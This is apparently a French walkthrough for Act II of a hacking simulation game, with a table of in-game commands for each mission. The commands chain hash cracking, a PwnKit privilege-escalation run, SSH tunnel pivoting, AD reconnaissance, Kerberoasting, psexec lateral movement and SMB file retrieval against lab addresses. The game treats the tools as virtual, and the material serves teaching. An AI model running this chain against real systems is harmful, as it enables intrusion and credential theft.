# Acte II — Gagner des accès (0.5.0)

Dix missions principales et six contrats facultatifs sont intégrés. Cette solution
contient les commandes de référence du laboratoire ; aucun outil réel n’est lancé.
Le périmètre est détaillé dans ACTE_II_COUVERTURE.md, les rencontres dans
ACTE_II_ACTEURS.md.

## Accès et progression

Termine l’acte I, accepte l’invitation d’Exployt puis active sa route Tor selon les
conditions existantes. Cendre te propose le premier dossier sur Telegrid. L’onglet
Campagne montre aussi les dix étapes de l’acte II. Les anciens contrats restent
séparés ; commencer l’acte II ne supprime aucun acquis. Les dossiers sont réglés
une fois, dans ColdVault ; les secondaires ne demandent aucun nouvel outil.

Une console par contexte : **A** reste locale dans Kali ; **B** sert à la session
distante ou au tunnel. Une ligne de mot de passe se saisit seulement à l’invite
correspondante. Un tunnel reste au premier plan dans B pendant les requêtes en A.
Les commandes du tableau s’exécutent une à une. Les lignes Telegrid sont des
comptes rendus ; Importer est l’import de collecte dans l’application BloodHound.

Les images Linux sont des images anciennes de laboratoire : une image corrigée
ne devient pas vulnérable du seul fait de partager un numéro de pkexec. Les scripts
et compilateurs du jeu sont des artefacts virtuels, pas une exécution de code C.

## Solutions — spoilers


### Une vieille passation

Contact : **cendre**.

| Où | Action |
|---|---|
| Console A (Kali) | `cat ~/mission/passation.txt` |
| Console A (Kali) | `hashcat -m 1000 ~/mission/ops.ntlm ~/mission/mots.txt` |
| Console A (Kali) | `hashcat -m 1000 --show ~/mission/ops.ntlm` |
| Telegrid | `rapport OR-26-201` |

### Un compte ne suffit pas

Un refus de `sudo -l` est ici une observation valide : le contrat demande une
lecture dans les droits du compte, pas une élévation.

Contact : **cendre**.

| Où | Action |
|---|---|
| Console B (session ou tunnel) | `ssh ops@10.71.1.10` |
| Console B (session ou tunnel) | `Relais2026!` |
| Console B (session ou tunnel) | `id` |
| Console B (session ou tunnel) | `uname -a` |
| Console B (session ou tunnel) | `sudo -l` |
| Console A (Kali) | `scp ops@10.71.1.10:/srv/exports/CT-26-201.txt ~/loot/compte.txt` |
| Console A (Kali) | `Relais2026!` |
| Console A (Kali) | `cat ~/loot/compte.txt` |
| Telegrid | `livraison CT-26-201` |

### Une machine mal entretenue

Contact : **cendre**.

| Où | Action |
|---|---|
| Console A (Kali) | `ssh ops@10.71.1.11` |
| Console A (Kali) | `Relais2026!` |
| Console A (Kali) | `dpkg-query -W policykit-1` |
| Console A (Kali) | `pkexec --version` |
| Console A (Kali) | `exit` |
| Console B (session ou tunnel) | `ssh ops@10.71.1.10` |
| Console B (session ou tunnel) | `Relais2026!` |
| Console B (session ou tunnel) | `dpkg-query -W policykit-1` |
| Console B (session ou tunnel) | `stat /usr/bin/pkexec` |
| Console B (session ou tunnel) | `gcc /home/ops/cve-2021-4034.c -o /home/ops/polkit-lab` |
| Console B (session ou tunnel) | `/home/ops/polkit-lab` |
| Console B (session ou tunnel) | `id` |
| Console B (session ou tunnel) | `cat /root/passation.txt` |
| Telegrid | `preuve OR-ROOT-203` |

### Derrière le serveur

Contact : **traverse**.

| Où | Action |
|---|---|
| Console B (session ou tunnel) | `ssh ops@10.71.1.10` |
| Console B (session ou tunnel) | `Relais2026!` |
| Console B (session ou tunnel) | `ip addr` |
| Console B (session ou tunnel) | `ip route` |
| Console B (session ou tunnel) | `ss -lntp` |
| Console B (session ou tunnel) | `cat /home/ops/reseau.txt` |
| Telegrid | `rapport 10.72.0.0/24` |

### Le passage étroit

Contact : **traverse**.

| Où | Action |
|---|---|
| Console B (session ou tunnel) | `ssh -N -L 8080:10.72.0.20:80 ops@10.71.1.10` |
| Console B (session ou tunnel) | `Relais2026!` |
| Console A (Kali) | `curl -o ~/loot/registre.txt http://127.0.0.1:8080/registre.txt` |
| Console A (Kali) | `cat ~/loot/registre.txt` |
| Telegrid | `livraison OR-NET-205` |

### Le réseau du prestataire

Contact : **iris**.

| Où | Action |
|---|---|
| Console A (Kali) | `ldapsearch -x -H ldap://10.71.2.10 -D audit@orbe.lab -W -b "DC=orbe,DC=lab" "(objectClass=*)"` |
| Console A (Kali) | `Audit2026!` |
| Console A (Kali) | `scp ~/tools/sharphound.exe audit@10.71.2.21:C:/Users/audit/sharphound.exe` |
| Console A (Kali) | `Audit2026!` |
| Console B (session ou tunnel) | `ssh audit@10.71.2.21` |
| Console B (session ou tunnel) | `Audit2026!` |
| Console B (session ou tunnel) | `C:\Users\audit\sharphound.exe --CollectionMethods Group,ObjectProps --OutputDirectory C:\Users\audit --ZipFileName orbe.zip` |
| Console A (Kali) | `scp audit@10.71.2.21:C:/Users/audit/orbe.zip ~/loot/orbe.zip` |
| Console A (Kali) | `Audit2026!` |
| BloodHound : importer | `/home/operator/loot/orbe.zip` |
| Telegrid | `rapport OR-AD-206` |

### Un service trop privilégié

Contact : **iris**.

| Où | Action |
|---|---|
| Console A (Kali) | `impacket-GetUserSPNs orbe.lab/audit:Audit2026! -dc-ip 10.71.2.10` |
| Console A (Kali) | `impacket-GetUserSPNs orbe.lab/audit:Audit2026! -dc-ip 10.71.2.10 -request -outputfile /home/operator/loot/tickets.txt` |
| Console A (Kali) | `hashcat -m 13100 ~/loot/tickets.txt ~/mission/services.txt` |
| Console A (Kali) | `hashcat -m 13100 --show ~/loot/tickets.txt` |
| Telegrid | `rapport OR-SPN-207` |

### Changer de machine

Contact : **quartz**.

| Où | Action |
|---|---|
| Console B (session ou tunnel) | `impacket-psexec orbe.lab/svc.backup@10.71.2.30` |
| Console B (session ou tunnel) | `Service2026!` |
| Console B (session ou tunnel) | `whoami /all` |
| Console B (session ou tunnel) | `systeminfo` |
| Console B (session ou tunnel) | `type C:\Data\exports\OR-26-208.txt` |
| Console A (Kali) | `smbclient //10.71.2.30/C$ -U svc.backup%Service2026! -c "get Data/exports/OR-26-208.txt /home/operator/loot/lateral.txt"` |
| Console A (Kali) | `cat ~/loot/lateral.txt` |
| Telegrid | `livraison OR-26-208` |

### La passation douteuse

Lire d’abord `cat ~/mission/garant.txt`. Une autre voie consiste à récupérer et
relire /garant.txt depuis le portail interne via le tunnel SSH. L’annonce et une
source actuelle doivent être comparées avant la décision.

Contact : **relay**.

| Où | Action |
|---|---|
| Console B (session ou tunnel) | `ssh ops@10.71.1.10` |
| Console B (session ou tunnel) | `Relais2026!` |
| Console B (session ou tunnel) | `cat /home/ops/recu.txt` |
| Telegrid | Choisir `refuser AC-26-209` ou `renegocier AC-26-209` |

### Premier travail en binôme

Contact : **quartz**.

| Où | Action |
|---|---|
Choisir une des deux voies ; les preuves de l’autre ne sont pas exigées.

Voie **pivot** :

| Où | Action |
|---|---|
| Console B (session ou tunnel) | `ssh -N -L 8080:10.72.0.20:80 ops@10.71.1.10` |
| Console B (session ou tunnel) | `Relais2026!` |
| Console A (Kali) | `curl -o ~/loot/binome.csv http://127.0.0.1:8080/bordereau.csv` |
| Console A (Kali) | `cat ~/loot/binome.csv` |
| Telegrid | `livraison OR-26-210 pivot` |

Voie **smb** :

| Où | Action |
|---|---|
| Console A (Kali) | `smbclient //10.71.2.30/C$ -U svc.backup%Service2026! -c "get Data/exports/OR-26-210.csv /home/operator/loot/binome.csv"` |
| Console A (Kali) | `cat ~/loot/binome.csv` |
| Telegrid | `livraison OR-26-210 smb` |

## Contrats facultatifs

Six contrôles distincts réutilisent les acquis. Chacun exige ses propres observations.

### act2_side_empreinte

| Où | Action |
|---|---|
| Console A (Kali) | `hashcat -m 1000 ~/mission/secours.ntlm ~/mission/secours.txt` |
| Telegrid | `rapport act2_side_empreinte` |

### act2_side_permissions

| Où | Action |
|---|---|
| Console B (session ou tunnel) | `ssh ops@10.71.1.10` |
| Console B (session ou tunnel) | `Relais2026!` |
| Console B (session ou tunnel) | `id` |
| Console B (session ou tunnel) | `sudo -l` |
| Telegrid | `rapport act2_side_permissions` |

### act2_side_tunnel

| Où | Action |
|---|---|
| Console B (session ou tunnel) | `ssh -N -L 8080:10.72.0.20:80 ops@10.71.1.10` |
| Console B (session ou tunnel) | `Relais2026!` |
| Console A (Kali) | `curl http://127.0.0.1:8080/diagnostic.txt` |
| Telegrid | `rapport act2_side_tunnel` |

### act2_side_annuaire

| Où | Action |
|---|---|
| Console A (Kali) | `ldapsearch -x -H ldap://10.71.2.10 -D audit@orbe.lab -w Audit2026! -b "DC=orbe,DC=lab" "(servicePrincipalName=*)"` |
| Telegrid | `rapport act2_side_annuaire` |

### act2_side_correctifs

| Où | Action |
|---|---|
| Console B (session ou tunnel) | `impacket-psexec orbe.lab/svc.backup@10.71.2.30` |
| Console B (session ou tunnel) | `Service2026!` |
| Console B (session ou tunnel) | `systeminfo` |
| Console B (session ou tunnel) | `powershell` |
| Console B (session ou tunnel) | `Get-HotFix` |
| Telegrid | `rapport act2_side_correctifs` |

### act2_side_recu

| Où | Action |
|---|---|
| Console A (Kali) | `smbclient //10.71.2.30/C$ -U svc.backup%Service2026! -c "get Data/exports/OR-26-216.txt /home/operator/loot/lateral.txt"` |
| Console A (Kali) | `cat ~/loot/lateral.txt` |
| Telegrid | `rapport act2_side_recu` |

## Conclusion et limites

Le choix sur la passation douteuse et la voie finale sont conservés. Les fiches
des contacts reflètent les dossiers vérifiés. Les actes III et IV restent à écrire.
Le terminal n’est pas un Linux ou un Windows complet ; toutes les commandes de
ces parcours sont qualifiées, mais les options et logiciels supplémentaires sont
limités au périmètre décrit dans ACTE_II_COUVERTURE.md. La qualification est faite
par API en mémoire et Godot sans affichage, pas par une partie humaine native.
